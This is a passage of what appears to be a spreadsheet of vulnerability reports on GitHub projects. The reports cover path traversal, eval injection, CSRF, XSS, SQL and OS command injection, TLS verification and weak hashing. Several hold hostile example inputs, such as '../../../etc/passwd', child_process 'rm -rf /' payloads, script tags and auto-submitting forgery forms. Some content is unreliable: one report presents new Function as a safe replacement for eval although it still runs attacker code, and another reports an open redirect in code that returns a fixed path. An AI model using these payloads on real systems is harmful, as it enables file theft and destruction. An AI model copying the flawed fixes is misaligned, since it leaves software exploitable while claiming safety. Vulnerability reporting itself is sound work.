Blind trust in input parsing opens up prototype pollution vectors.

Security Implications:
If exploited:
•	Server-wide variable tampering is possible
•	Privilege escalation by injecting admin-like properties
•	Application denial of service (DoS) by crashing JSON parsing logic
•	Inconsistent behavior due to prototype overrides

Suggested Fix:
--- streamApi.ts	2025-04-27
+++ streamApi_fixed.ts	2025-04-27
@@
-import isString from 'lodash/isString';
+import isString from 'lodash/isString';
+import secureParse from 'secure-json-parse'; // new safe parser

 if (req.query.filter != null && isString(req.query.filter)) {
-    req.query.filter = JSON.parse(req.query.filter.replace(/\+/g, ' '));
+    try {
+        req.query.filter = secureParse.safeParse(req.query.filter.replace(/\+/g, ' '));
+        if (!req.query.filter || typeof req.query.filter !== 'object') {
+            throw new Error('Invalid filter format');
+        }
+    } catch (error) {
+        reply.code(400).send({ error: 'Invalid filter JSON structure' });
+        return;
+    }
 }

"
83,1745738565953,https://github.com/konecty/Konecty/blob/main/src/server/routes/rest/file/download.ts,CWE-22/CWE-23,Critical,2025-04-27T07:22:45.000Z,2025-04-27T12:21:21.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Proof of Concept (Elaborated):
Vulnerable Code:
const destination = path.join(document, code, fieldName, fileName);
return sendFile(reply, req.url, destination);
Step-by-Step Explanation:
1.	Problem:
The server builds a filesystem path (destination) using user-controlled URL parameters (document, code, fieldName, fileName).
2.	No Path Validation:
The combined path is not validated or sanitized to ensure it stays inside an intended ""safe"" directory.
3.	How to Attack:
A malicious user can craft the incomingPath to include directory traversal sequences like:
4.	../../../etc/passwd
causing path.join to resolve to sensitive system files outside the intended download directory.
5.	Effect:
If sendFile directly reads and sends the file at the computed destination, the attacker can:
o	Read sensitive files (e.g., /etc/passwd, .env, server source code)
o	Leak credentials or API keys
o	Cause privilege escalation
Example Exploit:
Request:
GET /file/../../../etc/passwd
Backend processing:
path.join('..', '..', '..', 'etc', 'passwd') // resolves to /etc/passwd
Result:
Server reads and sends back /etc/passwd to the attacker.

Severity:
Critical (File Disclosure / Information Leakage)

Root Cause:
The application blindly constructs a file system path from untrusted input and does not check if the resolved path remains within an expected base directory.

Exploit Scenario:
An attacker can supply URL parameters with ../../../ patterns to trick the application into reading arbitrary system files, thereby leaking sensitive server data.
Why It Happens:
Because no validation or restriction is performed on the user-supplied path components (document, code, fieldName, fileName) before joining and accessing the file system.
Security Implications:
If exploited:
•	Attacker can read sensitive system files.
•	Server configuration files, private keys, environment variables may be leaked.
•	Attack could be used for privilege escalation or to facilitate further attacks.
Suggested Fix:
--- fileDownloadApi.ts	2025-04-27
+++ fileDownloadApi_fixed.ts	2025-04-27
@@
+const SAFE_BASE_DIRECTORY = '/var/www/uploads'; // example safe folder

 async function fileDownloadFn(
 	req: FastifyRequest<{ Params: { '*': string } }>,
 	reply: FastifyReply,
 ) {
 	const incomingPath = req.params['*'];

 	if (downloadUrlRegex.test(incomingPath)) {
 		logger.trace(`DOWNLOAD_URL_PATTERN ${incomingPath}`);
 		const [, document, code, fieldName, fileName] = downloadUrlRegex.exec(incomingPath) ?? [];

-		const destination = path.join(document, code, fieldName, fileName);
+		const destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);
+		if (!destination.startsWith(SAFE_BASE_DIRECTORY)) {
+			logger.warn(`Blocked path traversal attempt: ${destination}`);
+			return reply.status(400).send({ error: 'Invalid file path' });
+		}
 		return sendFile(reply, req.url, destination);
 	}

 	if (legacyDownloadUrlRegex.test(incomingPath)) {
 		logger.trace(`LEGACY_DOWNLOAD_URL_PATTERN ${incomingPath}`);
 		const [, , , document, code, fieldName, fileName] = legacyDownloadUrlRegex.exec(incomingPath) ?? [];

-		const destination = path.join(document, code, fieldName, fileName);
+		const destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);
+		if (!destination.startsWith(SAFE_BASE_DIRECTORY)) {
+			logger.warn(`Blocked path traversal attempt: ${destination}`);
+			return reply.status(400).send({ error: 'Invalid file path' });
+		}
 		return sendFile(reply, req.url, destination);
 	}

 	logger.trace(`File not found ${incomingPath}`);

 	return reply.status(404).send();
 }

"
84,1745739408304,keystonejs/keystone/blob/main/packages/auth/src/lib/useFromRedirect.ts,CWE-601,Low,2025-04-27T07:36:48.000Z,2025-04-29T01:51:52.000Z,"Vulnerability Type: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')


Proof of Concept:

Line: 1
import { useMemo } from 'react'

// TODO: remove or fix
export function useRedirect() {
  return useMemo(() => '/', []);
}

Step-by-Step:
1. The `useRedirect` hook returns a static `'/'`, but a `TODO` indicates future changes.
2. If future modifications make the redirect dynamic based on user input (without validation), attackers can manipulate the redirection path.
3. A crafted payload could redirect users to a malicious external site without their knowledge, leading to phishing or other attacks.


Severity: 2 – Low


Root Cause: The presence of a TODO marker combined with improper use of `useMemo` for a static value indicates poor code practices. There is no validation process planned for future dynamic redirect behavior, making it highly likely that unsafe modifications could introduce an open redirect vulnerability.


Exploit Scenario: An attacker could manipulate a dynamic redirect parameter (if added later) to force the application to send users to an external malicious URL, tricking users into entering sensitive information on fake sites that appear legitimate.


Why It Happens: The vulnerability occurs because of incomplete implementation planning (leaving a TODO unresolved) and improper use of a hook that could evolve into dynamic redirect functionality without enforcing strict validation on the redirect targets.


Security Implications: If exploited, an attacker could perform phishing attacks, steal user credentials, hijack sessions, or damage user trust by redirecting them to untrusted third-party websites directly from the legitimate application’s domain.


Suggested Fix: Removed the unnecessary `useMemo` call, eliminated the unresolved TODO comment."
85,1745740193403,https://github.com/advisories/GHSA-9hqh-fmhg-vq2j,CWE-95,Low,2025-04-27T07:49:53.000Z,2025-04-27T08:12:45.000Z,"Vulnerability Type:
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

Proof of Concept:
The vulnerable code uses eval(input.extendOutputFunction) to dynamically execute a string from user input. This allows an attacker to supply malicious code like:
{ ""extendOutputFunction"": ""process.exit()"" }
which will execute immediately when evaluated. Worse payloads can read files, run system commands, or crash the server.

Vulnerable Code:
extendOutputFunction = eval(input.extendOutputFunction);

Severity:
Low

Root Cause:
The code directly executes user-controlled input without validation or sanitization. eval() interprets the string as executable JavaScript, leading to possible code injection.

Exploit Scenario:
An attacker submits malicious JavaScript code inside the extendOutputFunction field. For example:

{ ""extendOutputFunction"": ""require('child_process').exec('rm -rf /')"" }
This would execute a shell command, delete server files, or cause serious harm.

Why It Happens:
The vulnerability occurs because eval() executes anything passed into it. Without validating or parsing the input securely, attackers can inject and run arbitrary commands on the server.

Security Implications:
If exploited, this can lead to Remote Code Execution (RCE), server crashes, data leaks, unauthorized file access, and full compromise of the server or underlying infrastructure.

Suggested Fix:
Replace eval() with a safer parsing approach using new Function, which treats the input as a function expression without executing arbitrary code:

extendOutputFunction = new Function(`return (${input.extendOutputFunction})`)();
Also validate that the result is a real function and properly handle syntax errors."
86,1745741491288,https://github.com/jcass77/WTFIX,CWE 295,Critical,2025-04-27T08:11:31.000Z,2025-04-27T17:01:55.000Z,"Vulnerability Type:
CWE-295: Improper Certificate Validation
CWE-297: Improper Validation of Certificate with Hostname Mismatch
The code disables both server certificate verification and hostname checking, leading to full SSL/TLS connection compromise.

Proof of Concept:
In the _open_connection method, the following unsafe code disables SSL verification:

if self.pipeline.settings.SSL_SKIP_VERIFY:
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

This disables both:
Certificate trust chain validation (CWE-295)
Hostname matching between certificate and server (CWE-297)

If an attacker sets up a fake server with any certificate, the client would trust it and connect without any warning.

Severity:
Critical
Both server certificate validation and hostname verification are turned off, allowing total interception and modification of secure communications (MITM attack).
The server identity can be forged, and the connection is fully compromised.

Root Cause:
The code explicitly disables ssl_context.check_hostname and sets ssl_context.verify_mode = ssl.CERT_NONE if SSL_SKIP_VERIFY is enabled.
This behavior completely disables the purpose of SSL/TLS — to guarantee the identity and authenticity of the server.

Exploit Scenario:
An attacker on the same network could perform a man-in-the-middle (MITM) attack by impersonating the intended server using a self-signed certificate.
Since the client does not validate the server’s certificate nor hostname, the attacker could steal sensitive data like passwords, session tokens, or inject malicious responses without the user's knowledge.

Example steps:
Set up a fake server at the same IP.
Present a fake certificate.
Client connects without warnings.
Attacker reads or modifies all traffic.

Why It Happens:
The system incorrectly assumes it is safe to disable certificate validation and hostname checking based on a configuration flag (SSL_SKIP_VERIFY).
SSL/TLS security depends entirely on validating the server’s identity, and skipping it nullifies the protection.

Security Implications:
If exploited, an attacker can:
Steal login credentials and sensitive session data.
Modify the data being sent or received (MITM).
Inject malware into client responses.
Maintain persistent access to confidential communications.

This completely undermines the confidentiality and integrity of the application’s communication channel, potentially causing widespread damage and data breaches.

Suggested Fix:
Always enforce server certificate validation and hostname verification.
Do not allow ssl_context.check_hostname to be disabled.
Do not allow ssl_context.verify_mode to be set to ssl.CERT_NONE.

Safe Code:

ssl_context = ssl.create_default_context()
# Never disable hostname verification or trust validation

If disabling validation is ever necessary (for local testing), it must be strictly separated from production code and require explicit acknowledgment."
87,1745742823244,https://github.com/mburaksayici/FinancialAdvisorGPT,CWE-942,Low,2025-04-27T08:33:43.000Z,2025-04-27T17:12:59.000Z,"Vulnerability Type:
CWE-942: Permissive Cross-domain Policy with Untrusted Domains
Allowing wildcard '*' in CORS settings exposes the application to cross-origin attacks.

Proof of Concept:
In main.py, CORS middleware is configured insecurely:

allow_origins=[""*""]
This allows any website, even malicious ones, to make API requests.
For example, an attacker’s website could send requests to your API endpoints and potentially access sensitive user data without proper authorization.

Severity:
Low
While the current CORS misconfiguration might seem less critical, if sensitive user data or authentication is involved, the risk can escalate rapidly, making exploitation dangerous.

Root Cause:
The root cause is setting allow_origins=[""*""] in the CORS configuration.
This trust-all policy allows any external domain to interact with protected backend APIs without any verification or restriction.

Exploit Scenario:
A malicious actor could build a website that automatically triggers requests to your backend.
Since CORS accepts all origins, the browser would not block the cross-origin requests, enabling attackers to steal user information or perform unwanted operations on behalf of authenticated users.

Why It Happens:
The application uses a CORS policy that permits requests from any origin, assuming that all clients are safe, which is false.
Browsers enforce CORS policies to protect users; disabling them wrongly undermines this critical defense mechanism.

Security Implications:
If exploited, attackers can access or modify private user data, perform unauthorized actions using the victim’s credentials, or expose sensitive server-side information to external malicious domains.

Suggested Fix:
Replace wildcard origins with explicit allowed domains like:

allowed_origins = ['https://example.com', 'https://sub.example.com']
Restrict headers to known custom headers like ""X-Custom-Header"", and allow only methods like ""GET"", ""POST""."
88,1745748644268,https://github.com/sagargoswami2001/School-Management-System-Using-Python,CWE-20,Medium,2025-04-27T10:10:44.000Z,2025-04-27T11:34:53.000Z,"Vulnerability Type:
Improper Input Validation (Missing Regular Expression Validation)

---

Root Cause:
The application accepts critical user inputs (Name, Email, Contact Number) without validating their format.  
There are no regular expressions (regex) or strict checks to ensure that the fields conform to expected patterns (e.g., email address format, numeric-only phone numbers).

As a result, invalid or maliciously crafted input can be directly stored into the database.

---

File: 
`School_Management_System.py`

 Functions: 
- `add_record()`

 Lines: 
Around lines 78–107 (inside `add_record` function).

---

Vulnerable Code:

```python
def add_record():
    ...
    name = name_strvar.get()
    email = email_strvar.get()
    contact = contact_strvar.get()
    ...
    connector.execute(
        'INSERT INTO SCHOOL_MANAGEMENT (NAME, EMAIL, PHONE_NO, GENDER, DOB, STREAM) VALUES (?,?,?,?,?,?)', 
        (name, email, contact, gender, DOB, stream)
    )
```

No validation is performed before inserting `email`, `contact`, and `name`.

---

Exploit Scenario:
An attacker (or even an unintentional user) can input invalid or malicious data:

- Email field: `evil_payload@""><script>alert(1)</script>`
- Contact field: `123abc4567`
- Name field: `; DROP TABLE SCHOOL_MANAGEMENT; --`

Impact:
- Invalid emails or numbers pollute the database.
- Broken email systems if connected later.
- Potential vector for stored XSS attacks via improperly sanitized fields.
- Malicious SQL behavior if inputs are not properly handled elsewhere.
- Application crashes or behaves unpredictably when reading malformed data.

---

 Why It Happens:
- Lack of input validation.
- No use of regular expressions (regex) to enforce patterns.
- Blind trust in user inputs reaching critical systems (database).

---

 Security Implications:
Successful exploitation may result in:

- Data Integrity issues — invalid or malicious data in critical databases.
- Stored XSS attacks — if records are later rendered into web or GUI elements.
- Database corruption — invalid types for expected fields (e.g., non-numeric phone numbers).
- Application crashes during data parsing.
- Elevated attack surface for future vulnerabilities (like injection or parsing errors).

---

Recommended Fix:

Implement strict input validation using regular expressions (regex) before inserting data.

Secure Replacement Code Example:

```python
import re

def add_record():
    ...
    email_pattern = r""[^@]+@[^@]+\.[^@]+""
    if not re.match(email_pattern, email):
        mb.showerror('Invalid Email', 'Please enter a valid email address.')
        return

    if not contact.isdigit() or len(contact) != 10:
        mb.showerror('Invalid Contact', 'Phone number must be exactly 10 digits.')
        return

    if not re.match(""^[A-Za-z ]+$"", name):
        mb.showerror('Invalid Name', 'Name should only contain letters and spaces.')
        return

     Proceed with database insert if all validations pass
    ...
```

---

Additional Recommendations:
- Always validate all user inputs, even if they are not directly used in critical operations immediately.
- Use strong and specific regex patterns based on field type (e.g., stricter email validation if needed).
- Conduct client-side and server-side validation both (if applicable).
- Consider using well-tested libraries for data validation (e.g., `validators`, `email-validator` in Python).

---

Important Note:
- Never assume GUI fields are safe; users (or automated scripts) can manipulate frontend controls.
- Input validation is a fundamental security layer against most forms of injection and corruption attacks.
- Regularly review and test validation logic during security assessments.
"
89,1745754817804,NiazMorshed2007/project-management/blob/master/src/routes/PrivateRoutes.jsx,CWE-287,High,2025-04-27T15:15:33.000Z,2025-04-27T23:16:46.000Z,"Bug Report: Authentication Bypass via Client-Side State Manipulation 
Vulnerability Type: Broken Authentication / Auth Bypass  
Severity: High  
CVSS v3.1 Score:8.2 (Privilege Escalation, Unauthorized Access)  
Path: 
`https://github.com/NiazMorshed2007/project-management/blob/master/src/routes/PrivateRoutes.jsx`

---

Explanation

---

Root Cause:
The application relies solely on client-side state management (`Redux` store’s `isLogged` flag) to determine if a user is authenticated.  
There is no server-side verification of authentication tokens (such as Firebase ID tokens or JWTs) during route access control.

Because the authentication check is based on easily modifiable local variables, attackers can manipulate the state (via DevTools or scripts) to gain unauthorized access to protected routes.

---

Exploit Scenario:
An attacker opens browser DevTools and manually sets the Redux `isLogged` flag to `true`:

```javascript
store.dispatch({ type: ""LOGIN_SUCCESS"" });
```
or modifies localStorage/sessionStorage (if stored there).

As a result:
- The application thinks the attacker is authenticated.
- Private pages and functionalities become accessible without valid login credentials.

---

Why It Happens:
The system trusts client-side logic for authentication, without any server/token verification or session validation.  
Client-side state alone should never be the single source of truth for authentication status.

---

Security Implications:
- Unauthorized Data Access: Private user data, projects, organizations may be accessed.
- Privilege Escalation: An attacker could gain elevated access depending on frontend routes.
- Business Logic Abuse: Unauthorized creation, deletion, or modification of entities.
- Data Breach Risks: Sensitive information may be exfiltrated.
---

Suggested Fix:

- Mandatory Server-Side Token Validation:
  - After login, the app must validate tokens like Firebase ID tokens or JWTs with backend APIs.
  - On each page load or action, verify session validity before allowing access.
  

  - Instead of relying only on Redux, use Firebase `onAuthStateChanged` listeners or server-side session checks.

- Implement Expiry and Refresh Mechanisms: 
  - Auth tokens must expire and be refreshed securely.

- Use HttpOnly Cookies for Auth Tokens:  
  - Reduce the chance of client-side token theft (e.g., XSS).

- CSP (Content Security Policy) Enforcement:
  - Prevent script injection attacks that could modify client state.

Example Secure Route Check:
```javascript
import { onAuthStateChanged } from ""firebase/auth"";

onAuthStateChanged(auth, (user) => {
  if (!user) {
    // Redirect to login
  } else {
    // Proceed
  }
});
```
or call backend `/validate-session` API to check token status.

---
"
90,1745757166204,tundeloper/Bankit/blob/master/script.js,CWE-79,Medium,2025-04-27T12:32:46.000Z,2025-04-28T17:47:42.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

This vulnerability occurs when user-controlled input is incorporated into web pages without adequate sanitization or escaping. Attackers can inject malicious JavaScript code that gets executed in the browser of users viewing the page. In this case, insertAdjacentHTML is used without sanitizing dynamic values, allowing XSS (Cross-site Scripting) attacks.

Proof of Concept:
In the Bankist application, transaction movements are rendered into the page using insertAdjacentHTML() directly with dynamic data, without validation or sanitization.


Example vulnerable code:

File: https://github.com/tundeloper/Bankit/blob/master/script.js
Line 134: containerMovements.insertAdjacentHTML('afterbegin', html);

Step-by-Step:

The displayMovements function dynamically builds HTML from user-related account data.

Values like movementsDates or movements can contain injected HTML.

When inserted using insertAdjacentHTML, malicious payloads are executed directly in the user’s browser.

Thus, an attacker could embed harmful scripts.

Severity: MEDIUM (3)

The vulnerability allows stored or reflected XSS attacks. It can lead to session hijacking, phishing, or unauthorized actions on behalf of users.
However, exploitation depends on being able to manipulate transaction or date inputs, which might require insider access or specific flows, hence classified as ""Medium"" severity.

Root Cause:
The root cause is using raw insertAdjacentHTML() to inject dynamic content without ensuring that user-provided or dynamic inputs are safe.
When an application trusts dynamic inputs blindly and embeds them into the DOM using HTML string interpolation, it opens the door for code execution attacks.
Proper sanitization or using safer APIs was missing.

Exploit Scenario:
Suppose an attacker manages to introduce a specially crafted date or movement data in an account, containing:

<img src=""x"" onerror=""alert('XSS')"">
When another user loads the transactions, this malicious input will be injected into the DOM, and the browser will execute the embedded script.
It can steal session cookies, redirect users to malicious pages, or perform unauthorized actions.

Why It Happens:
The application fails to treat dynamic inputs as untrusted by default. It directly includes unsanitized values into HTML strings and injects them into the DOM using insertAdjacentHTML.
Without escaping dangerous characters or validating content structure, browsers interpret the inserted text as active HTML, making script execution possible.

Security Implications:
If exploited successfully:

Attackers could hijack users' sessions or impersonate them.

Sensitive user data (like account balances, transaction details) could be stolen.

Attackers could create fake overlays for phishing attacks.

Overall platform trust would be severely damaged, and the company could face compliance penalties (e.g., GDPR violations).

Suggested Fix:
To fix the vulnerability:

Avoid using insertAdjacentHTML() for dynamic content.

Use DOM APIs like document.createElement(), .textContent, and .appendChild() to safely build elements.

Alternatively, use a trusted sanitization library like DOMPurify before inserting untrusted HTML.

"
91,1745757617710,https://github.com/emma-worgu/banking,CWE-352,High,2025-04-27T12:40:17.000Z,2025-04-28T17:58:04.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)

This vulnerability arises when a web application allows state-changing operations to be performed without verifying that the request is intentionally initiated by the user. Without CSRF tokens, malicious third-party sites can trick authenticated users into executing unwanted actions unknowingly.

Proof of Concept:
In the current Express application, after body parsing middleware (express.json, express.urlencoded) and CORS setup, there is no CSRF protection implemented.
Example:

app.use(cors(corsOption));
app.use('/api/user/', userRoute);
Incoming POST/PUT/DELETE requests are processed without validating their origin.

Malicious sites could exploit this to perform unauthorized operations through an authenticated user's session.

Thus, an attacker can forge cross-site requests.

Severity:
HIGH

The lack of CSRF protection leaves sensitive POST/PUT/DELETE routes vulnerable to unauthorized actions triggered from external websites.
Depending on the functionalities exposed under /api/user/, exploitation could result in data modification, account misuse, or administrative actions.

Root Cause:
The root cause is the absence of CSRF protection middleware (csurf or similar).
When building web applications, especially RESTful APIs dealing with authenticated sessions or cookies, CSRF tokens are necessary to verify that each state-changing request is genuine and intentional.

The system fails to add this essential protection layer.

Exploit Scenario:
Suppose a user is logged into the application.
An attacker could build a hidden HTML form that automatically submits a POST request to /api/user/sensitiveAction on behalf of the user without their consent.

Example:

<form action=""https://yourapp.com/api/user/updateProfile"" method=""POST"">
  <input type=""hidden"" name=""email"" value=""attacker@example.com"" />
</form>
<script>document.forms[0].submit();</script>
When the user visits a malicious page, their session cookie is used to authorize the unintended request.

Why It Happens:
This vulnerability occurs because the application does not verify incoming state-changing requests using unique CSRF tokens.
The server blindly trusts the requests based solely on session authentication, without validating that the requests originate from the actual website interface or an authenticated user interaction.

Security Implications:
A successful CSRF attack could result in:

Unauthorized changes to user profiles.

Malicious fund transfers.

Unwanted account deletions.

Full control of critical operations under the compromised session. It risks data integrity, privacy, and platform trust, with potential regulatory and legal consequences (e.g., GDPR violation penalties).

Suggested Fix:
Apply CSRF protection middleware (csurf) to the Express app:

Add csurf after session and body parsing middleware.

Generate a CSRF token for each session or request.

Require the token to be submitted with every POST, PUT, PATCH, or DELETE request."
92,1745757840319,https://github.com/reflex-dev/reflex/blob/main/reflex/app.py,CWE-502,High,2025-04-27T12:44:00.000Z,2025-04-29T02:02:11.000Z,"LINE 1777

Root Cause: The vulnerability arises because the application deserializes untrusted JSON data from HTTP headers without proper validation. The json.loads() function processes raw client input, which can include malicious payloads leading to unsafe object creation or code execution.

Exploit Scenario: An attacker sends a forged WebSocket message with a malicious JSON payload in the header. When parsed, this payload could manipulate the application's state, inject harmful data, or trigger unexpected behavior through crafted event handlers or state modifications.

Why It Happens: The code directly deserializes client-provided data (headers or event content) using json.loads() without sanitizing or validating the input. Trusting unverified external input allows attackers to exploit the deserialization process.

Security Implications: Successful exploitation could lead to remote code execution, data tampering, or unauthorized access. Attackers might compromise server integrity, steal sensitive information, or disrupt service availability.

Suggested Fix: Avoid deserializing untrusted data. Implement strict input validation, use allowlists for allowed event handlers/fields, and sanitize all client inputs. Replace generic JSON parsing with schema validation (e.g., Pydantic) to ensure data integrity before processing.
"
93,1745758134579,https://github.com/junquant/saproject/code/bot/jiakbot /retriever.py,CWE-89,High,2025-04-29T02:39:36.000Z,2025-04-29T03:17:42.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
The Retriever class constructs SQL queries using .format() directly from user input, like:


sql_str = ""SELECT * FROM venues WHERE food LIKE '%{0}%'"".format(requested_food)
This is dangerous because an attacker could inject malicious SQL code inside requested_food, allowing unauthorized query manipulation or data leakage.

Severity:
HIGH

Root Cause:
The application uses string formatting methods (.format()) to directly insert user-controlled values into SQL queries.
This fails to separate user input from SQL code, making it vulnerable to SQL Injection attacks where malicious users can alter queries by injecting special characters.

Exploit Scenario:
An attacker provides a requested_food input such as:

%' OR '1'='1
The SQL query becomes:


SELECT * FROM venues WHERE food LIKE '%%' OR '1'='1%'
Thus, the WHERE condition always evaluates to true, leaking all venue records or potentially allowing database tampering.

Why It Happens:
It happens because the code does not parameterize SQL queries properly.
By combining user data and SQL structure using formatting methods, the boundary between trusted SQL code and untrusted input gets blurred, creating a classic injection vulnerability.

Security Implications:
If exploited, this vulnerability can lead to:

Unauthorized access to database records.

Information disclosure.

Data corruption, manipulation, or deletion.

Possible elevation of privileges depending on the database configuration.

Suggested Fix:
Replace all formatted queries with parameterized queries using ? placeholders.
Values should be passed separately from the query text in the execute() method:

query = ""SELECT * FROM venues WHERE food LIKE ?""
cursor.execute(query, (""%input_value%"",))
This ensures SQL commands and user input are strictly separated, preventing injections."
94,1745758308984,https://github.com/reflex-dev/reflex/blob/main/reflex/.templates/web/utils/state.js,CWE-94,Medium,2025-04-27T12:51:48.000Z,2025-04-29T01:59:22.000Z,"Summary
The Reflex web application exhibits a code injection vulnerability (CWE-94) by passing unsanitized, attacker-controlled data into JavaScript’s eval and dynamic import routines, enabling execution of arbitrary code on the client side. This arises from improper validation and sanitization of inputs before evaluation, exposing the app to critical risks such as remote code execution, cross-site scripting, and data compromise (Direct Dynamic Code Evaluation - Eval Injection, Code Injection. Mitigation requires eliminating unsafe eval usage, enforcing strict input sanitization and whitelisting, and adopting safer parsing or interpretation APIs.

Vulnerability Report
Root Cause: The code directly feeds untrusted, remote data into JavaScript’s eval and dynamic import mechanisms without any validation or sanitization, allowing arbitrary strings to be executed as code .

Exploit Scenario: An attacker injects malicious JavaScript payloads into the component string (e.g., via WebSocket events or JSON5 inputs), which the app then evals, granting the attacker control of the execution context and enabling arbitrary code execution

Why It Happens: The design relies on eval-based dynamic code evaluation for React components and script callbacks, trusting remote inputs rather than using safe interpreters or whitelists, thus failing to enforce input constraints

Security Implications: Successful exploitation can lead to full client-side compromise—data theft, session hijacking, malware injection, or pivoting to backend services—constituting severe XSS or RCE threats.

Suggested Fix: Remove or replace all uses of eval with parameterized parsing or templating engines; implement strict input validation, whitelisting of allowed values, and output escaping; and conduct regular security audits to detect similar vulnerabilities."
95,1745758725455,Ishudarju/Inventory_System_Management_Bankend_Node.js_SQL/blob/main/index.js,CWE-352,High,2025-04-27T15:54:40.000Z,2025-04-28T18:05:58.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery occurs when unauthorized commands are transmitted from a user trusted by the application. If the app does not verify that a request came from an authenticated, intended source, malicious third-party websites can perform actions on behalf of the authenticated user without their knowledge. CSRF attacks compromise the integrity of user actions.

Proof of Concept:
In the provided codebase, after setting up body parsing and CORS, no CSRF protection mechanism is applied.


Vulnerable part:

File:
https://github.com/Ishudarju/Inventory_System_Management_Bankend_Node.js_SQL/blob/main/index.js

Line 100: app.use(cors({...}));
Line 115: app.use(express.json());
Line 135: app.use('/products', productRoutes);

There is no verification that POST/PUT/DELETE requests originated from the legitimate user interface.

An attacker could craft forms that automatically submit malicious requests to endpoints like /products, /admin, etc., without the user's consent.

Thus, users are vulnerable.

Severity: HIGH (4)

The vulnerability allows an attacker to manipulate important operations (product updates, expense records, invoice generation) by exploiting authenticated user sessions.
Given the administrative nature of this application (invoicing, pharmacy management), the potential business impact is severe.

Root Cause:
The root cause is the lack of CSRF validation for incoming state-changing HTTP requests.
The application processes sensitive requests based only on authentication (cookies/sessions), but without any challenge to confirm that the request was intentionally made by the user.

Without using a CSRF token, any request is automatically trusted.

Exploit Scenario:
A user logs into the application backend.
They then visit a malicious site that automatically submits a POST request to /admin/deleteAccount, passing a form without the user even seeing it.
Since the app has no CSRF protection, the server accepts the unauthorized request and deletes the user account or modifies invoices.

Example:

<form action=""https://yourapp.com/admin/deleteAccount"" method=""POST"">
  <input type=""hidden"" name=""userId"" value=""victim_id"">
</form>
<script>document.forms[0].submit();</script>
Why It Happens:
It occurs because the Express server does not require proof of user intention (such as a server-generated CSRF token) when processing sensitive operations.
Thus, it is vulnerable to unauthorized state-changing requests transmitted via authenticated user sessions but initiated by a third-party attacker.

Security Implications:
Successful exploitation of CSRF could allow attackers to:
Delete users, products, or invoices.
Modify critical financial records.
Create fake expense entries.
Hijack or sabotage admin actions.
This can result in severe loss of business integrity, financial loss, compliance issues (e.g., GDPR violations), and reputation damage.

Suggested Fix:
Apply CSRF protection using the csurf package:
Install and initialize CSRF middleware after parsing body data.
Generate and validate CSRF tokens for all POST, PUT, PATCH, DELETE requests.
Make CSRF token available via res.locals.csrfToken and embed it in all forms or API requests.

Correct Implementation:


const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});"
96,1745759328862,https://github.com/reflex-dev/reflex/blob/main/benchmarks/benchmark_package_size.py,CWE-78,Medium,2025-04-27T13:08:48.000Z,2025-04-29T01:57:09.000Z,"Summary
The script invokes subprocess.check_output on line 23 with the user-supplied --path argument without any sanitization, creating a CWE-78 OS command injection risk by allowing shell meta-characters to be interpreted and executed. An attacker could embed malicious operators (e.g., ; rm -rf /) into the CLI parameter to run arbitrary system commands under the application’s privileges, potentially leading to full system compromise, data exfiltration, or privilege escalation. To remediate, the code should drop shell invocation, use shell=False with argument lists, and enforce strict input validation or whitelisting of allowed paths.

Vulnerability Report (Line 23: CWE-78)
Root Cause:
The code directly embeds the unsanitized path argument into a shell command passed to subprocess.check_output, allowing attackers to inject shell metacharacters into the executed command string.

Exploit Scenario:
An adversary running the script can supply a crafted value like --path=""; rm -rf /"" or --path=""&& whoami"" so that the shell executes unintended commands alongside the intended directory-size check, leading to arbitrary code execution.

Why It Happens:
The vulnerability exists because subprocess.check_output is invoked in a mode that concatenates the entire command into a shell string—by default or via implicit shell=True semantics—trusting remote input instead of using a safer, argument-list API, with no validation or escaping of dangerous characters.

Security Implications:
If exploited, attackers gain the ability to execute any OS command with the privileges of the Python process, enabling data theft, system disruption, installation of malware, and lateral movement within the network.

Suggested Fix:
Refactor to use subprocess.run([...], shell=False) or subprocess.check_output([...], shell=False), pass the command and its arguments as a list rather than a single string, and strictly validate or whitelist the path input (e.g., via Python’s shlex.split or regex checks) to reject unsafe characters."
97,1745760086197,https://github.com/reflex-dev/reflex/blob/main/reflex/components/el/elements/forms.py,CWE-916,Low,2025-04-27T13:21:26.000Z,2025-04-29T01:55:11.000Z,"Vulnerability Report (Line 190: CWE-916)

Root Cause:
The code uses the outdated MD5 algorithm to hash hook definitions for uniqueness. MD5 is cryptographically broken, extremely fast, and lacks collision resistance, making it unsuitable for any security-sensitive identifier generation.

Exploit Scenario:
An attacker could craft two distinct sets of form hooks whose string representations collide under MD5. By submitting specially constructed hook data, they force the same handle_submit_unique_name for both, enabling them to override or hijack legitimate form submit handlers.

Why It Happens:
The implementation blindly applies hashlib.md5(...).hexdigest() to arbitrary hook data without salting or using a stronger algorithm. Reliance on MD5’s output for security-critical uniqueness violates modern cryptographic standards.

Security Implications:
Successful hash collisions allow an adversary to predict or duplicate handler names, enabling them to inject malicious logic into event callbacks, siphon form data, or bypass client-side controls—effectively undermining application integrity.

Suggested Fix:
Use a secure hash function such as SHA-256 (e.g., hashlib.sha256) with a salt, or employ a random UUID (e.g., uuid.uuid4()) for unique handler names. Encapsulate hashing logic in a utility module to facilitate future algorithm upgrades."
98,1745763646183,KOSASIH/PiFinance-Core/blob/main/src/utils/cryptoUtils.js,CWE-327,Critical,2025-04-27T15:53:21.000Z,2025-04-28T18:08:39.000Z,"Vulnerability Type:
CWE-327: Use of a Broken or Risky Cryptographic Algorithm
CWE-780: Use of Cryptographic Algorithm without Integrity Checking

Using insecure or outdated encryption modes can compromise data confidentiality and integrity. CBC mode without authenticated encryption is vulnerable to padding oracle attacks and does not guarantee data integrity. A stronger mode like AES-GCM must be used to provide authenticated encryption.

Proof of Concept:
In the provided crypto utility, encryption was implemented using:

